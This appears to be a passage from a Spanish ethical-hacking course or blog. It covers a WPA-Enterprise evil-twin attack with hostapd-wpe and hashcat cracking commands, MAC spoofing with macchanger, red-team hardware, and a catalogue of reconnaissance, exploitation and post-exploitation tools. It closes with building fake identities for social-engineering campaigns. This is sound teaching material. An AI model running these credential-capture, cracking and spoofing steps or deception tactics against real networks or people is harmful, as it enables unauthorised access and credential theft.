- Otro requisito es que el cliente no debe tener implementada la validación del certificado del Punto de Acceso (Necesitaría tener desplegada la CA Interna en los clientes).

**Detalles del ataque**
Implementar un punto de acceso falso que se anuncia como un punto de acceso legítimo para la red SSID a suplantar. Este punto de acceso falso se comunica con un servidor RADIUS simulando una interconexión con Active Directory administrado por el atacante.

En caso en que la CA no se encuentre desplegada en los dispositivos legítimos de la red, no pueden comprobar si el Punto de Acceso implementado es legítimo o fraudulento y harán un intento de autenticación.

De esta forma, los clientes legítimos que se encuentren en el radio de cobertura del Punto de acceso falso, enviarán sus credenciales de forma transparente a la plataforma del atacante.

**Implementación**
Para poder realizar este tipo de ataque, es necesario que nuestra tarjeta de red soporte ponerla en modo Master, en caso contrario no se podrá configurar el Punto de Acceso falso.

También es necesario instalar el entorno de AP falso + Radius se utiliza una versión modificada de hostapd llamada hostapd-wpe. En caso de no estar instalado por defecto se puede instalar cómodamente con el gestor de paquetes apt.

```bash
apt-get install hostapd-wpe
```

Recordad que se ha de parar el servicio NetworkManager para que no capturen la interfaz de red que queremos utilizar para generar el punto de acceso falso.

```bash
systemctl stop NetworkManager
```

Comprobar el fichero de configuración de hostapd (normalmente se encuentra en /etc/hostapd-wpe/hostapd-wpe.conf aunque dependiendo de la instalación puede variar) modificando el modo, canal y el nombre de la red del punto e acceso falso según corresponda. A continuación se muestra un ejemplo del contenido del fichero de configuración (Tener en cuenta que dependiendo de la banda y el canal que queramos sólo debemos indicar un modo, a ó g).

```bash
nano /etc/hostapd-wpe/hostapd-wpe.conf
```

```bash
interface=wlan0 #Interfaz en la que se levantará el Punto de Acceso_
ssid=[ssid_de_la_red] #Nombre de la red_
channel=[1-14] [36-136] #Elegir el canal en el que se implementará el Punto de Acceso fraudulento_
mode=g #(Para la banda de los 2,4 GHz)_
mode=a #(Para la banda de los 5 GHz)_
```

Una vez se ha configurado el Punto de Acceso hay que iniciar hostapd-wpe para que comience a operar el punto de acceso falso.

```bash
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

Nos prepara el intento de autenticación en formato hashcat para poder realizar un proceso de cracking y revertir la contraseña.

Realizar el proceso de cracking de contraseñas con hashcat, podemos utilizar un enfoque basado en diccionario o un enfoque basado en máscaras.

```bash
hashcat -m 5500 -a 0 hashes-capturadass.txt /usr/share/wordlists/rockyou.txt --session prueba1 --potfile-path passwords.pot
hashcat -m 5500 hashes-capturadas.txt -a3 -1 ?u?l?d ?1?1?1?1?1?1?1?1?1?1 -i --increment-min=8 --increment-max=10 --session prueba1 --potfile-path passwords.pot
```

**Ataques al control de accesos**
Una de las medidas de "seguridad" es controlar qué dispositivos puede acceder a la red y cuáles no. A nivel doméstico esto se hace utilizando un sistema de listas blancas y listas negras de direcciones MAC. A priori puede parecer una buena idea, porque el atacante no tendrá un dispositivo con esa MAC y, además, no tendrá acceso a la lista. Sin embargo, como se ha visto anteriormente, nada le impide capturar el tráfico y ver qué MAC de cliente está conectada a un AP, con lo que podrá identificar las MAC autorizadas. La suplantación de la MAC de una interfaz de red es trivial, en Linux es tan sencillo como utilizar un comando para ejecutar la aplicación macchanger. En las redes empresariales es más complicado saltarse esta autenticación, puesto que se utilizan servidores para comprobar el cliente.

**Instalar Macchanger en Linux**
Macchanger es una utilidad que esta disponible en casi todas las distribuciones de Linux por lo que su disponibilidad no representa problema alguno.

Para poder instalarlo basta con buscar Macchanger con nuestro gestor de software preferido.

Para instalar Macchanger en Debian, Ubuntu y derivados de estos basta con teclear el siguiente comando:

```bash
sudo apt-get install macchanger macchanger-gtk
```

**Utilizar Macchanger en Linux**
Para comenzar a utilizar esta aplicación en nuestro sistema lo primero que debemos de hacer después de haberla instalado es identificar y conocer nuestra dirección MAC, para ello debemos abrir una terminal y ejecutar el siguiente comando:

```bash
ifconfig
```

Y nos desplegará un listado de información donde podremos ver nuestra dirección MAC en ella que estará delante de HWaddr.

O también con este comando:

```bash
ip link show wlan0
```

Y la dirección aparece delante de link/ether xx:xx:xx…

Para poder cambiar la direccion MAC de nuestro equipo desde la terminal basta con ejecutar alguno de los siguientes comandos acorde a lo que necesitamos.

Primero necesitamos desactivar nuestra intefaz de red para ello ejecutamos:

```bash
sudo ifconfig wlan0 down
```

Tambien lo puedes hacer con:

```bash
ip link set dev wlan0 down
```

Hecho esto ahora si podemos proceder a utilizar la aplicación. Para el caso de crear una dirección completamente MAC completamente aleatoria, basta con ejecutar:

```bash
macchanger -r wlan0
```

Para aleatorizar solo los bytes específicos del dispositivo de la dirección MAC actual (es decir, si la dirección MAC estuviera marcada, aún se registraría como del mismo proveedor), ejecutan el comando:

```bash
macchanger -e wlan0
```

Para cambiar la dirección MAC a un valor específico basta con teclear:

```bash
macchanger --mac=XX:XX:XX:XX:XX wlan0
```

Cambiamos XX:XX:XX:XX:XX:XX por la MAC al que deseas cambiar.

Finalmente, para devolver la dirección MAC a su valor de hardware original y permanente:

```bash
macchanger -p wlan0
```

Y volvemos a habilitar nuestra interfaz de red con:

```bash
ifconfig wlan0 up
```

O también con:

```bash
ip link set dev wlan0 up
```

*Donde wlan0 es mi interfaz de red, esta puede variar un poco como wlanX, ethX, enpXX entre otras.*

En el siguiente [enlace](https://book.hacktricks.wiki/es/generic-methodologies-and-resources/pentesting-wifi/index.html) podéis obtener más información sobre pentesting wifi.

# **Equipos de Seguridad. Pentesting vs Red Teaming

Habitualmente se distinguen dos tipos de equipos de seguridad:

- **Red Team (Equipo Rojo):** Realiza labores de seguridad ofensiva, por lo que en ellas se incluyen las acciones de un hacker ético.
- **Blue Team (Equipo Azul):** Realiza labores de seguridad defensiva como respuesta a incidentes, análisis forense digital, investigación de amenazas, bastionado de sistemas, seguridad operativa. etc...

A menudo, los términos pentesting y red teaming se confunden o se usan indistintamente, pero hay diferencias importantes entre ellos. Un pentest está orientado a una acción concreta sobre un objetivo y cuya duración en el tiempo suele ser reducida. En cambio, las labores del Red Team consisten en un ejercicio continuo y constante de prueba de las defensas del objetivo para tratar de superarlas evitando ser descubiertos. Estos ejercicios o simulacros emulan el comportamiento de grupos de ciberdelincuentes, también llamados **APT** (_Advanced Persistent Threat_), y cuyo modus operandi se encuentra en la matriz de táctica, técnicas y procedimientos (TTP) de **[MITRE Att&ck](https://attack.mitre.org/)**.

Por tanto, el objetivo del Blue Team será que el Red Team no tenga éxito. La forma tradicional de organizar estos equipos era que trabajasen de forma independiente. Más recientemente aparece el **Purple Team**, que realiza una puesta en común del trabajo de ambos equipos para analizar las debilidades, establecer mejoras y organizar los siguientes ejercicios.

**Técnicas de Red Team**
En ocasiones, la labor del Red Team involucra el acceso físico a las instalaciones de la empresa auditada, lo que plantea un escenario totalmente distinto  al de un test de intrusión. En estos accesos físicos puede ser necesario utilizar **lock picking**, que consiste en desbloquear candados o cerraduras para tener acceso a lugares restringidos.

El lock picking clásico empleando ganzúas está cada menos presente debido al uso de los sistemas de acceso electrónicos y biométricos,. Hay numerosas herramientas para auditar y tratar de atacar estos sistemas de acceso; la más conocida del mercado es **Proxmark 3**.

El dispositivo hardware más empleado en los ataques físicos es el **Rubber Ducky USB**, un minicomputador que simula el comportamiento de un teclado y que en caso de ser conectado en un equipo puede desplegar de forma automática numerosas acciones programadas de antemano. La idea detrás de este dispositivo es colocarlo de forma clandestina en el ordenador de algún empleado mientras no está en su puesto de trabajo. Solo unos segundos son suficientes para comprometer el equipo y obtener una puerta de entrad en la empresa. Este tipo de dispositivo se conoce como **Bad USB**.

Un dispositivo con características similares es el **Bash Bunny**, que, además de poder simular un teclado, también puede simular otros dispositivos hardware, como una tarjeta de red Ethernet, un puerto serie o un dispositivo de almacenamiento, por lo que los vectores de ataque pueden ser más variados. Ambos dispositivos son fabricados y distribuidos por la empresa **[hak5](https://shop.hak5.org/)**.

Existen muchos otros dispositivos, como **Flipper Zero**, **KeyCroc**, **Evil Crow RF** y **Evil Crow RF V2**. Se puede encontrar toda la información de estos dispositivos, así como los enlaces a las tiendas online donde se pueden comprar en su repositorio de github.

# **Clasificación de Vulnerabilidades**

Se pueden realizar distintas agrupaciones de vulnerabilidades, dependiendo del criterio que utilicemos a la hora de catalogarlas.  

**Dependiendo del acceso al componente vulnerable**  
El primer grupo de vulnerabilidades se puede catalogar según el tipo de acceso requerido para acceder al componente vulnerable  

- **Vulnerabilidad remota:** En este caso es posible acceder al componente vulnerable de manera remota, normalmente porque el componente vulnerable se encuentra expuesto directamente en internet.
- **Vulnerabilidad local:** De manera totalmente opuesta, en este caso para acceder al componente vulnerable es necesario disponer de un acceso local al activo vulnerable. Este primer acceso local se puede conseguir mediante distintas vías: El atacante tiene acceso al activo vulnerable, El atacante ha comprometido previamente el activo vulnerable y tiene acceso de manera remota.

**Dependiendo a quién va dirigida**  
Dependiendo quien se vea afectado tras materializar la vulnerabilidad podremos realizar la siguiente agrupación 

- **Vulnerabilidades que afectan al cliente:** En este caso concreto la materialización de la vulnerabilidad tiene un impacto directo sobre el cliente del aplicativo.
- **Vulnerabilidades de servidor:** En este otro caso la materialización de la vulnerabilidad afecta de manera directa al componente o servicio afectado.

**Dependiendo de su tiempo de vida**  
Dependiendo del tiempo de vida de una vulnerabilidad podemos englobar las vulnerabilidades en 3 tipos de categorías diferentes:  

- **Vulnerabilidades Zero day:** Este tipo de vulnerabilidades no se conocen de manera pública, tan siquiera por la organización responsable del diseño del producto afectado, sin embargo, la vulnerabilidad es descubierta y, normalmente, explotada por ciberdelincuentes para atacar sistemas. También puede referirse a la vulnerabilidad no conocida que encuentra un investigador de seguridad y la reporta a la compañía u organización responsable del producto. Aunque tengan constancia de la vulnerabilidad, hasta que no se publica la vulnerabilidad y se genera un parche o actualización para solventarla ésta es considerada una vulnerabilidad de tipo “0-Day”
- **Vulnerabilidades One day:** Este tipo de vulnerabilidades ocurren cuando el producto afectado publica un parche para una vulnerabilidad que no se conocía. Al ser publicada se comparan las versiones anteriores con la versión publicada, se localiza el fallo en las versiones anteriores y se genera la vulnerabilidad para las versiones anteriores que presentan el fallo. Normalmente la prueba de concepto que explota la vulnerabilidad no está accesible de manera pública.
- **Vulnerabilidades públicas:** Este tipo de vulnerabilidades explotan un fallo conocido en versiones antiguas del sistema o el software y cuyo código, para explotar la vulnerabilidad, se encuentra disponible de manera pública. De esta manera cualquiera puede acceder al código y utilizarlo para atacar los sistemas vulnerables.

# **Herramientas de Seguridad y Hacking Ético**

Hay que tener en cuenta que cada día existen más herramientas enfocadas en distintas tareas del ámbito del hacking ético.

Por si esto no fuera suficiente, la comunidad open source aporta a este ecosistema la gran mayoría de las herramientas utilizadas. Esto quiere decir que muchas de las herramientas que se utilizan activamente hoy en día puede que queden desactualizadas o en desuso en un futuro. Sin embargo, aparecerán nuevas herramientas destinadas a suplir las carencias que pudieran tener las anteriores.  

En las siguientes entradas de este blogs se mostrarán brevemente el tipo de herramientas utilizadas en cada fase y en posteriores módulos se explicará en detalle el uso específico de las herramientas más importantes.

**Herramientas de Descubrimiento y Reconocimiento**  
La fase de reconocimiento es la primera de todas las fases de una auditoría de sistemas o infraestructura. En ella se trata de obtener la máxima cantidad de información posible de los activos que conforman el alcance de la auditoría.

Existen dos tipos de reconocimiento que detallaremos brevemente junto con las herramientas más comunes utilizadas y las capacidades que aportan.

- **Reconocimiento pasivo**  
Es el proceso de recolección de información del objetivo que se está auditando a través de fuentes de información de dominio público.

En ningún momento se establece comunicación con el objetivo. En su lugar, esta información es obtenida a través de motores de búsqueda (Google, Bing, etc.), whois, página web de la organización, etc.

A continuación se muestran algunas herramientas utilizadas durante el reconocimiento pasivo:  

- **Redes Sociales**

    **Actividades:**  

     - Obtener datos de contacto y personales
     - Averiguar intereses personales
     - Averiguar tecnologías utilizadas en la compañía

    **Herramientas:**  

    - **twitterscrapper:** Recopila información de un determinado perfil en twitter.
    - **ultimate facebook scrapper:** Recopila información de un determinado perfil en Facebook.
    - **scrapedin crawler:** Recopila información de un determinado perfil en LinkedIn.

- **Aplicaciones colaborativas**

    **Actividades:**  

    - Se puede obtener las tecnologías utilizadas en la organización.
    - Se puede llegar a obtener porciones de código de aplicativos desarrollados por el cliente objeto de la auditoría.
    - Se pueden llegar a extraer credenciales de usuario o APIKeys.

  **Herramientas:**  

    - **pastehunter:** Realiza búsquedas en pastebin buscando información sensible o fragmentos de código
    - **githubscrapper:** Herramienta para buscar información sensible en GitHub, encuentra credenciales, APIKeys, ficheros de configuración, etc.

- **Buscadores**

    **Actividades:**  

    - Se pueden realizar búsquedas muy concretas haciendo uso de operadores de búsqueda.
    - Existen recopilaciones de búsquedas tipo para localizar rápidamente sistemas vulnerables, dispositivos expuestos, etc.

    **Herramientas:**  

    - **Google:** Es el buscador más utilizado. Dispone de numerosos operadores de búsqueda.
    - **Bing:** Buscador de Microsoft. Permite realizar búsquedas basadas en direcciones IP.
    - **Shodan:** Indexa tecnología y servicios. Permite realizar búsquedas por servicios y versiones concretas.
    - **Censys:** Buscador parecido a Shodan. Permite realizar activos que compartan los mismos datos en el certificado.

- **Registros whois**

    **Actividades:**  

    - Se pueden obtener a quién pertenece una dirección IP pública y sus datos de contacto.
    - Se puede localizar los rangos de direccionamiento IP pertenecientes a una determinada compañía.

  **Herramientas:**  

    - **comando whois:** Herramienta de consola versiones para vario S.O.
    - **whois.domaintools.com:** Servicios web que nos facilitan la realización de consultas whois a través de este portal en internet

- **Email harvesting**

    **Actividades:**  

    - Búsqueda de direcciones de correo electrónico del personal perteneciente a la compañía auditada.

    **Herramientas:**  

    - **theHarvester:** Herramienta que recopila información sobre direcciones de correo electrónico asociadas a un determinado dominio.

**Reconocimiento activo**  
Es el proceso de recolección de información del objetivo que se está auditando a través del uso de técnicas o herramientas que se comunican con el activo a auditar.

Estas pruebas pueden ser detectadas por el objetivo dado que es necesaria una interacción directa contra el mismo. Por ejemplo, realizar un descubrimiento de puertos, un crawling, etc.

A continuación se muestran algunas herramientas utilizadas durante el reconocimiento activo:  

- **Enumeración DNS**

    **Actividades:**  

    - Averiguar la dirección IP asignada a un host (y en algunas ocasiones el host asociado a una determinada dirección IP).
    - Obtener los principales servidores asociados a un dominio (NS, MX y SOA).
    - Si se encuentra mal configurada la transferencia de zona se pueden volcar todos los registros del dominio.

    **Herramientas:**  

    - **dig y nslookup:** Herramientas de consola que nos permite realizar consultas DNS de manera manual.
    - **dnsrecon:** Automatiza todas las consultas que deberíamos realizar mediante dig o nslookup. Además, Nos proporciona la información de manera estructurada.
    - **dnsenum:** Similar a dnsrecon pero aporta la ventaja de realizar descubrimientos de host y/o subdominios mediante técnicas de fuerza bruta.

- **Enumeración SMTP**

    **Actividades:**  

    - Enumerar cuentas de usuario en un determinado dominio.

    **Herramientas:**  

    - **smpt-user-enum:** Script que automatiza la enumeración de cuentas de usuario a través del protocolo SMTP y mediante los comandos (RCPT, EXPN y VRFY).

- **Enumeración SNMP**

    **Actividades:**  

    - Obtener información de la configuración de dispositivos.
    - Modificar la configuración de los dispositivos.
    - Utiliza claves por defecto "public" y "private" para acceder a la información o gestionar los dispositivos respectivamente.

    **Herramientas:**  

    - **onesixtyone:** Utiliza técnicas de fuerza bruta para averiguar los community strings que nos permiten acceder a los roles public y private.
    - **snmpwalk:** En caso de disponer (o averiguar) las community string de acceso se puede acceder a la configuración de un dispositivo.

- **Enumeración SMB**

    **Actividades:**  
    Permite obtener información de la configuración de una red Microsoft Windows:  

    - Políticas de contraseñas
    - Usuarios
    - Grupos
    - Equipos
    - ID de usuario y host

    **Herramientas:**  

    - **nbtscan y enum4linux:** Herramientas que establecen una sesión con el sistema remoto y recupera la información disponible.
    - **Scripts nmap:** nmap es una herramienta de análisis de red que proporciona capacidades de enumeración gracias a diversos scripts.

**Herramientas de Escaneo y Monitorización**  
La fase de escaneo se realiza después de realizar la fase de reconocimiento. En ella tratamos de obtener más información sobre el propósito de los activos incluidos en el alcance de las pruebas.

Se averigua los distintos componentes de la infraestructura, el rol que desempeña cada activo, el número de servicios y versiones de los mismos que se encuentran prestando servicio en cada activo.

Además, también se realiza un análisis de las posibles vulnerabilidades existentes en el sistema tomando como referencia las versiones de los servicios que el activo sustenta así como la versión del Sistema Operativo.

De esta manera podremos localizar si los activos auditados presentan algún tipo de vulnerabilidad publica.

A continuación se muestran los diversos tipos de escaneo y una serie de herramientas para poder realizarlos.

**Escaneo de red**  
Trata de obtener mayor información sobre la red objetivo, direccionamiento IP y la arquitectura utilizada para sustentar la infraestructura.  

- **Wireshark / tcpdump**: Son dos motores de análisis de los datos transmitidos en una comunicación que circulan por la red. Aunque no son herramientas que realicen labores de escaneo, se utilizan para poder capturar y analizar los paquetes que  enviamos o recibimos a través de nuestro interfaz de red.
- **arpscan / net discover**: Ambas herramientas permite el descubrimiento de equipos remotos monitorizando los mensajes broadcast de tipo ARP Discovery que llegan a nuestro interfaz de red.
- **nmap como escáner de red**: La herramienta nmap puede ser utilizada en los tres tipos de categorías de escaneo (Escaneo de red, escaneo de servicios y escaneo de vulnerabilidades). En el caso de realizar un escaneo de red hay que saber previamente el rango de red a escanear (Dato que puede obtenerse mediante el uso de las dos herramientas anteriores)

**Escaneo de servicios**  
Orientada a obtener información sobre los servicios específicos, versiones y tecnología de los mismos presentes en cada activo de la infraestructura.

- **nc / netcat**: Herramienta de red que permite establecer comunicación con los puertos TCP/UDP, asociar una shell a un puerto en concreto y poner un puerto UDP/TCP a la escucha. Además, el operador -z permite utilizar nc como escáner de puertos
- **nmap como escáner de servicios**: En cuanto al escaneo de servicios nmap puede localizar puertos abiertos en equipos remotos y utilizar varias técnicas para evadir los sistemas de protección de red en el protocolo TCP. Estás técnicas de evasión se basan en el funcionamiento del establecimiento de la comunicación en el protocolo TCP
- **Zenmap**: Proporciona las mismas capacidades que la herramienta nmap pero incorpora la particularidad de poder representar los resultados mediante una interfaz gráfica de una manera más visual. También incluye ciertos tipos de escaneos preconfigurados a falta de introducir el objetivo

**Escaneo de vulnerabilidades**  
Una vez completado los escaneos de red y de servicios, se comprueba si existe alguna vulnerabilidad conocida para cada protocolo y versión del software utilizado.

- **nmap como escáner de vulnerabilidades**: Es posible utilizar nmap como escáner de vulnerabilidades haciendo uso de los scripts de detección de vulnerabilidades.  
- **Scripts específicos**: Scripts de nmap que buscan ciertas vulnerabilidades de las versiones de algunos servicios. Todos estos scripts se engloban bajo la categoría “vuln” podemos indicar que ejecuten los scripts de este tipo.  
- **Proyecto vulscan**: Utiliza nmap para realizar una búsqueda de posibles vulnerabilidades basándonos en la versión de los servicios localizados en el sistema remoto. Se apoya en un script nse y una base de datos de vulnerabilidades locales para detectar los servicios vulnerables (https://github.com/scipag/vulscan)  
- **nessus**: Es la aplicación de escaneo de vulnerabilidades más conocida y utilizada. Realiza los tres tipos de escaneos (escaneo de red, escaneo de servicios/versiones y escaneo de vulnerabilidades) de una manera totalmente desatendida. (https://es-la.tenable.com/products/nessus).
- **OpenVas**: Es un scanner de vulnerabilidades de seguridad parecido a Nessus, también realiza los tres tipos de escaneo de manera desatendida. Aunque tiene una versión de pago, los plugins que detectan las vulnerabilidades no se encuentran tan actualizados como los de nessus. (https://www.openvas.org).

**Herramientas de Explotación**  
Tras la identificación de vulnerabilidades en los servicios identificados en las fases anteriores, el siguiente paso es poder explotar las vulnerabilidades que hubieran sido descubiertas.

El objetivo de esta frase es mostrar el riesgo real de la vulnerabilidad, en base a la confidencialidad integridad y disponibilidad de la información. Para ello necesitamos hacer uso de ciertas herramientas de explotación dependiendo del vector de ataque.

A continuación se enumeran algunas de ellas junto a sus principales características.

**Explotación de vectores específicos**  
Aunque el vector más común de ataque consiste en la explotación de una vulnerabilidad, no es el único vector que nos puede dar acceso a un equipo remoto.

A continuación, realizamos una enumeración de los más importantes:

- **Ejecución de un programa malintencionado**

También conocido como malware consiste en generar un payload o shellcode en un formato ejecutable o camuflado dentro de un programa legítimo. Este programa se puede distribuir de distintas maneras a las víctimas, pero siempre está condicionado a un factor de ingeniería social para que la víctima ejecute el malware.

Por ejemplo, esconder el payload en una macro de Excel y enviar un correo masivo a los empleados de una compañía para que crean que en el Excel está la relación de subidas salariales.

**Herramientas:**

- **msfvenom:** Herramienta para generar y ofuscar malware para distintas plataformas.
- **shellter:** Herramienta utilizada para camuflar Malware en aplicativos legítimos.
- **goPhish:** Framework dedicado al envío de correos Phishing.

- **Credenciales por defecto o poco robustas**

Vector de acceso muy común debido a que cierto software y dispositivos de red se despliegan con una contraseña por defecto establecida por el fabricante. Si esta contraseña no se modifica, puede ser utilizada por un atacante para ingresar en el sistema.

**Herramientas:**

- **Patator:** Herramienta para realizar ataques de fuerza bruta con alto grado de configuración. Permite establecer las condiciones necesarias evaluar la respuesta emitida por el equipo remoto y considerar si las credenciales introducidas son correctas.
- **Medusa:** Herramienta que realiza fuerza bruta de Login en distintos protocolos. Permite paralelismo de conexiones.
- **Hydra:** Herramienta que realiza fuerza bruta de Login en distintos protocolos. Se recomienda para realizar fuerza bruta de las community strings de SNMP.

**Proxies de interceptación**

Son herramientas que nos permiten monitorizar las comunicaciones de red e incluso modificar la información enviada por el protocolo. Normalmente este tipo de herramientas se utilizan en comunicaciones a nivel HTTP/HTTPS.

- **BurpProxy**: Proxy de interceptación HTTP/HTTPS dispone de una versión community (gratuíta) y una versión de pago que incluye numerosas características. Permite monitorizar y modificar el tráfico HTTP/HTTPS, dispone de plugins para ampliar las capacidades del framework e incluso dispone de una funcionalidad de escáner automático. (https://portswigger.net/burp)
- **ZapProxy**: Proxy de interceptación HTTP/HTTPS es una herramienta opensource desarrollado por la fundación OWASP. Permite monitorizar y modificar el tráfico HTTP/HTTPS, dispone de plugins para ampliar las capacidades del framework e incluso dispone de una funcionalidad de escáner automático. (https://www.zaproxy.org/)  
- **Echo Mirage**: Proxy de interceptación para Sistemas Operativos Microsoft windows que permite monitorizar y modificar los paquetes de red de cualquier protocolo. Está muy limitado en el sentido que no se puede modificar el tamaño del paquete de datos a enviar. (https://sourceforge.net/projects/echomirage.oldbutgold.p/)

**Exploits públicos o Pruebas de Concepto (PoC)**  
Son herramientas específicas para aprovecharse de una vulnerabilidad en concreto, se suelen desarrollar con fines educativos y suelen disponer de licencia opensource.  

- **exploit-db**: Base de datos online de búsqueda de vulnerabilidades y exploits. disponible en la dirección URL. (https://www.exploit-db.com/)
- **Github como repositorio de pruebas de concepto**: Utilizado como repositorio de código fuente, también podemos localizar pruebas de concepto de vulnerabilidades, e incluso exploits totalmente funcionales. (https://github.com/search?q=CVE-2022) 
- **searchsploit**: Herramienta disponible en Kali Linux, Base de Datos local con todos los exploits públicos de exploit-db. (https://www.kali.org/tools/exploitdb/)

**Frameworks de explotación**  
Son herramientas tipo suite que incluyen un gran número de exploits de vulnerabilidades conocidas así como otras características de explotación y postexplotación como puedan ser módulos auxiliares de escaneo, shells avanzadas, servidores tipo Command and Control, etc.

- **Metasploit**: Esta herramienta es una suite completa de Explotación y Postexplotación y contiene una gran cantidad de exploits y módulos auxiliares para su consulta y uso. Dispone de versiones open source y comercial. (https://www.metasploit.com/)
- **CobaltStrike**: En este caso Cobaltstrike es un servidor Comand and Control totalmente configurable, además posee bastantes módulos de postexplotación y un shellcode propio llamado "beacon". En este caso es una herramienta comercial. (https://www.cobaltstrike.com/)

**Herramientas de Postexplotación**  
La fase de Postexplotación está separada por una delgada línea de la fase de explotación. Y es que las dos fases son prácticamente idénticas, la única diferencia es que en la fase de Postexplotación ya partimos de un primer sistema comprometido y nuestro objetivo será utilizar los mismos vectores de ataque para conseguir elevar privilegios en el equipo comprometido o intentar explotar otro equipo al alcance desde el equipo comprometido. Utilizar el equipo para “pivotar” a red interna, etc.

De esta manera, gran parte de las aplicaciones utilizadas durante la fase de explotación también serán utilizadas en esta fase de Postexplotación.  
  
- **Shellcodes**: Una shellcode es un tipo de payload que normalmente inicia una Shell de comandos en un equipo que se ha podido comprometer a través de una vulnerabilidad o exploit, pudiendo controlar de manera remota la máquina comprometida.
- **msfvenom**: La herramienta msfvenom es un framework incluido en la suite Metasploit que se utiliza para generar los payloads y/o shellcodes. Se puede utilizar la herramienta para generar estos payloads por separado y en numerosos formatos de salida. (https://www.offsec.com/metasploit-unleashed/msfvenom/)  
- **Meterpreter**: Es un payload avanzado de tipo Shellcode disponible en Metasploit. Es extensible de manera dinámica mediante la inyección de librerías dlls, pudiendo cargar módulos en el equipo comprometido de manera dinámica. Además, se ejecuta enteramente en memoria sin dejar traza en disco. Puede inyectarse en distintos procesos siempre que dispongamos de privilegios elevados para modificar el contexto del proceso. (https://www.offsec.com/metasploit-unleashed/about-meterpreter/)  
- **Beacons**: Es el payload avanzado de Cobalt. Es totalmente configurable y permite la modificación de shellcodes a través del “Artifact-Kit”. También permite modificar los protocolos de comunicación que utiliza para tratar de pasar desapercibido mediante tráfico legítimo. Al igual que meterpreter, puede inyectarse en otros procesos y ejecutarse enteramente en memoria. Por otro lado, permite la carga dinámica de módulos. (https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/post-exploitation_main.htm)  

**Elevación de privilegios**  
Es el proceso que describe la acción de conseguir un nivel de permisos más elevados en un sistema, existen numerosas técnicas y herramientas para poder realizar este tipo de acciones. A continuación se presentan algunas de las más utilizadas:  

- **PrivescCheck**: Esta herramienta es capaz de enumerar los problemas más comunes de configuración de Windows que se pueden aprovechar para la escalada de privilegios locales. También recopila diversa información que puede ser útil para la explotación y/o post-explotación. El propósito de esta herramienta es ayudar a los consultores de seguridad a identificar posibles debilidades en las máquinas con Windows durante los Test de intrusión. Genera muchas trazas en el equipo remoto. (https://github.com/itm4n/PrivescCheck)
- **WinPEAS**: Al igual que PrivescCheck realiza una búsqueda de patrones claros en la configuración, o en la falta de actualizaciones del sistema, que permitan a un usuario realizar una elevación de privilegios local en un sistema Microsoft Windows. Como particularidad, para cada técnica de elevación de privilegios presenta un enlace a la información necesaria para aprovecharse de ella. (https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)  
- **LinPEAS**: Al contrario que WinPEAS realiza una búsqueda de patrones claros en la configuración, o en la falta de actualizaciones del sistema, que permitan a un usuario realizar una elevación de privilegios local en sistemas basados en LINUX. De manera similar a su homólogo, para cada técnica de elevación de privilegios presenta un enlace a la información necesaria para aprovecharse de ella. (https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

**Extracción de información**  
Es el proceso que se realiza para tratar de extraer información confidencial o sensible del sistema, por ejemplo, credenciales o hashes.  

- **Mimikatz**: Herramienta utilizada para extraer información sensible de la memoria RAM de Windows, se pueden extraer hashes, credenciales en claro, tokens, etc. También permite ejecutar técnicas avanzadas para utilizar las credenciales y hashes capturadas, como son el uso de técnicas de tipo "Pass the Hash" y la generación de "Golden Tickets".(https://github.com/gentilkiwi/mimikatz)
- **Keyloggers**: Las herramientas de tipo keylogger se ejecutan en una máquina comprometida para capturar todas las pulsaciones de teclado. De esta manera se puede llegar a recopilar credenciales que el usuario del equipo haya podido introducir para acceder a un determinado sistema o aplicativo. (https://www.offsec.com/metasploit-unleashed/keylogging/)

# **Generación de Identidad Falsa**

Es posible que en nuestras investigaciones necesitemos disponer de identidades falsas que nos permitan obtener información sin poner en riesgo nuestra verdadera identidad. Por ejemplo, sería necesario para periodistas o agentes de las fuerzas y cuerpos de seguridad que quieren investigar o infiltrarse en determinados grupos. También, para un _hacker ético_ es necesario si se realizan acciones de _Red Team_ y se pretende diseñar alguna campaña de engaño mediante Ingeniería social. Por ejemplo, podríamos tener la identidad falsa de un jefe de recursos humanos o directivo de una empresa que contacta con un trabajador de la empresa objetivo por email, o por redes sociales, para hacerle una oferta de trabajo y tratar de obtener información interna, o para ganarnos su confianza y que abra un fichero malicioso desde el equipo de la empresa que nos permita obtener acceso a sus sistemas.

El primer paso será generar la identidad. Para ello disponemos de algunas herramientas online que generan datos personales aleatorios, de acuerdo con algunas características previas que hayamos indicado, como el sexo o la nacionalidad:

- https://www.fakenamegenerator.com/
- https://en.namefake.com/

El segundo paso será obtener una dirección de correo electrónico temporal que nos permita crear cuentas en redes sociales sin tener que usar alguno de nuestros correos personales. Hay muchas opciones disponibles, algunas de ellas son las siguientes:

- https://correotemporal.org/
- https://www.guerrillamail.com/
- https://temp-mail.org/

En algunos casos, el registro en la red social puede requerir la verificación mediante el envío de un SMS a nuestro número de teléfono. Hay algunas herramientas online que permiten obtener números de teléfono temporales, pero es más difícil que tengan éxito, puesto que normalmente ya han sido usadas previamente.

- https://sms-man.com/es
- https://receive-sms-online.info/
- https://sms-receive.net/
- https://www.receiveasms.com/
- https://hs3x.com/
- https://www.freeonlinephone.org/
- http://receivefreesms.com/

Existen también otras opciones de pago como **Hushed** (https://hushed.com/), una aplicación móvil que nos permite crear un segundo número de teléfono virtual.

Por último, tras crear la cuenta en la red social de nuestra elección, necesitamos rellenarla de información, imágenes, seguidores, etc., para hacerla creíble y que parezca real.

Algunos sitios en Internet permiten generar rostros de personas cuyas imágenes podemos emplear como foto de perfil:

- https://thispersondoesnotexist.com/
- https://generated.photos/
- https://www.faceapp.com/
- https://www.whichfaceisreal.com/

Además, recientemente han surgido avances espectaculares en la generación de imágenes mediante descripciones de texto usando Inteligencia Artificial, ejemplos de ello son **DALL-E** de OpenAPI, **Imagen** de Google Text-to-Image de DeepAI o **Stable Diffusion** de Stability AI.

# **Reconocimiento Pasivo / OSINT**

En esta entrada de este blog se verá cómo obtener información de la organización a partir de fuentes abiertas, lo que denomina "reconocimiento pasivo" u OSINT (del inglés Open Source Intelligence).

Con el reconocimiento pasivo se buscará toda la información posible sobre la red y los sistemas del objetivo sin establecer conexión directa con el mismo. Internet proporciona una gran ayuda a la hora de buscar información en fuentes abiertas, por lo que será la base para realizar este reconocimiento. 

